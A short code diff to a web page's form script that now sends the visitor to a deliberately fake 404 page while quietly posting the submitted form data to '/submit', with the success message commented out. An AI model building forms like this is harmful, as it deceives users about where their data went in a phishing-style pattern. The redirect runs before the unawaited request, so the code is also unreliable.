@@ -351,20 +351,19 @@
 
 
   <script>
-    document.getElementById("dataForm").addEventListener("submit", async function(e) {
+    document.getElementById("dataForm").addEventListener("submit",  function(e) {
       e.preventDefault();
       const formData = new FormData(this);
       const data = Object.fromEntries(formData);
-
       window.location.href = "/notfound.html";
 
-      await fetch("/submit", {
+       fetch("/submit", {
         method: "POST",
         headers: {"Content-Type": "application/json"},
         body: JSON.stringify(data)
       });
 
-      alert("Data submitted successfully!");
+      // alert("Data submitted successfully!");
       // Redirect to fake 404 page
     });
   </script>
